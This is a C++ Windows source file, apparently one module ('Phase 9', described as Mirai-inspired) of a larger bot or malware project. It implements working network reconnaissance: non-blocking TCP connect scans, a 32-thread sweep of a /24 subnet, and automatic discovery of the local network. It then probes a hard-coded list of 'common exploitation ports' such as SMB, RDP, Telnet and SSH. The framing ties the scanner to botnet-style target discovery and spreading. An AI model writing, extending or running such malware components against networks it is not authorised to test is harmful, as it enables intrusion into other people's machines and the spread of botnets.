#include "scanner.h"
#include "utils.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <vector>
#include <string>
#include <sstream>
#include <thread>
#include <mutex>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

// ============================================================================
// Phase 9: SCANNER MODULE (Mirai-Inspired)
// Functionality:
//   1. Non-blocking TCP connect scan
//   2. /24 subnet sweep with multi-threading
//   3. Auto-detect local network and scan common exploitation ports
// ============================================================================

// --- WSA Init Helper ---
static bool wsa_init() {
    static bool initialized = false;
    if (!initialized) {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) == 0) {
            initialized = true;
        }
    }
    return initialized;
}

// --- Single Port Scan (Non-blocking TCP Connect) ---
bool scan_port(const std::string& host, int port, int timeout_ms) {
    if (!wsa_init()) return false;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return false;

    // Set non-blocking
    u_long mode = 1;
    ioctlsocket(sock, FIONBIO, &mode);

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host.c_str(), &addr.sin_addr);

    connect(sock, (sockaddr*)&addr, sizeof(addr));

    // Wait for connection with select()
    fd_set write_fds, except_fds;
    FD_ZERO(&write_fds);
    FD_ZERO(&except_fds);
    FD_SET(sock, &write_fds);
    FD_SET(sock, &except_fds);

    timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;

    int result = select(0, nullptr, &write_fds, &except_fds, &tv);
    bool open = (result > 0) && FD_ISSET(sock, &write_fds) && !FD_ISSET(sock, &except_fds);

    closesocket(sock);
    return open;
}

// --- Port Name Lookup ---
static std::string port_service(int port) {
    switch (port) {
        case 21: return "FTP";
        case 22: return "SSH";
        case 23: return "Telnet";
        case 25: return "SMTP";
        case 80: return "HTTP";
        case 135: return "RPC";
        case 139: return "NetBIOS";
        case 443: return "HTTPS";
        case 445: return "SMB";
        case 1433: return "MSSQL";
        case 3306: return "MySQL";
        case 3389: return "RDP";
        case 5432: return "PostgreSQL";
        case 5900: return "VNC";
        case 8080: return "HTTP-Alt";
        case 8443: return "HTTPS-Alt";
        default: return std::to_string(port);
    }
}

// --- Parse CSV Ports ---
static std::vector<int> parse_ports(const std::string& csv) {
    std::vector<int> ports;
    std::istringstream ss(csv);
    std::string token;
    while (std::getline(ss, token, ',')) {
        int p = std::atoi(token.c_str());
        if (p > 0 && p < 65536) ports.push_back(p);
    }
    return ports;
}

// --- Subnet Scanner (Multi-threaded) ---
struct ScanResult {
    std::string host;
    int port;
};

static std::mutex g_scan_mutex;

static void scan_host_thread(const std::string& host, const std::vector<int>& ports,
                              std::vector<ScanResult>& results, int timeout_ms) {
    for (int port : ports) {
        if (scan_port(host, port, timeout_ms)) {
            std::lock_guard<std::mutex> lock(g_scan_mutex);
            results.push_back({ host, port });
        }
    }
}

std::string scan_subnet(const std::string& subnet_prefix, const std::string& ports_csv) {
    std::vector<int> ports = parse_ports(ports_csv);
    if (ports.empty()) return "Error: No valid ports specified.";

    log_msg("[SCANNER] Scanning " + subnet_prefix + ".0/24 on " + std::to_string(ports.size()) + " ports...");

    std::vector<ScanResult> results;
    std::vector<std::thread> threads;

    // Scan 1-254 with thread pool (max 32 concurrent)
    const int MAX_THREADS = 32;
    for (int i = 1; i <= 254; i += MAX_THREADS) {
        threads.clear();
        for (int j = i; j < i + MAX_THREADS && j <= 254; j++) {
            std::string host = subnet_prefix + "." + std::to_string(j);
            threads.emplace_back(scan_host_thread, host, std::ref(ports),
                                  std::ref(results), 800);
        }
        for (auto& t : threads) {
            if (t.joinable()) t.join();
        }
    }

    // Format results
    if (results.empty()) {
        return "Scan complete: 0 open ports found on " + subnet_prefix + ".0/24";
    }

    std::ostringstream ss;
    ss << "=== Scan Results: " << subnet_prefix << ".0/24 ===\n";
    ss << "Host              | Port  | Service\n";
    ss << "------------------+-------+----------\n";

    // Sort by host then port
    std::sort(results.begin(), results.end(), [](const ScanResult& a, const ScanResult& b) {
        return a.host < b.host || (a.host == b.host && a.port < b.port);
    });

    for (auto& r : results) {
        char line[128];
        snprintf(line, sizeof(line), "%-17s | %-5d | %s\n",
                 r.host.c_str(), r.port, port_service(r.port).c_str());
        ss << line;
    }
    ss << "\nTotal: " << results.size() << " open ports found.";

    log_msg("[SCANNER] Complete. " + std::to_string(results.size()) + " open ports found.");
    return ss.str();
}

// --- Auto LAN Discovery ---
std::string scan_lan() {
    // Get local IP to determine subnet
    if (!wsa_init()) return "Error: WSA init failed.";

    // Get adapter info
    ULONG buf_size = 0;
    GetAdaptersInfo(nullptr, &buf_size);
    std::vector<BYTE> buf(buf_size);
    PIP_ADAPTER_INFO adapters = (PIP_ADAPTER_INFO)buf.data();

    if (GetAdaptersInfo(adapters, &buf_size) != NO_ERROR) {
        return "Error: Failed to get network adapter info.";
    }

    // Find first non-0.0.0.0 adapter
    std::string local_ip;
    PIP_ADAPTER_INFO adapter = adapters;
    while (adapter) {
        std::string ip = adapter->IpAddressList.IpAddress.String;
        if (ip != "0.0.0.0" && ip.find("127.") != 0) {
            local_ip = ip;
            break;
        }
        adapter = adapter->Next;
    }

    if (local_ip.empty()) {
        return "Error: No active network adapter found.";
    }

    // Extract subnet prefix (first 3 octets)
    size_t last_dot = local_ip.rfind('.');
    if (last_dot == std::string::npos) return "Error: Invalid IP format.";
    std::string subnet = local_ip.substr(0, last_dot);

    // Common exploitation ports
    std::string ports = "21,22,23,80,135,139,443,445,1433,3306,3389,5432,5900,8080";

    std::string header = "Local IP: " + local_ip + "\nSubnet: " + subnet + ".0/24\n\n";
    return header + scan_subnet(subnet, ports);
}
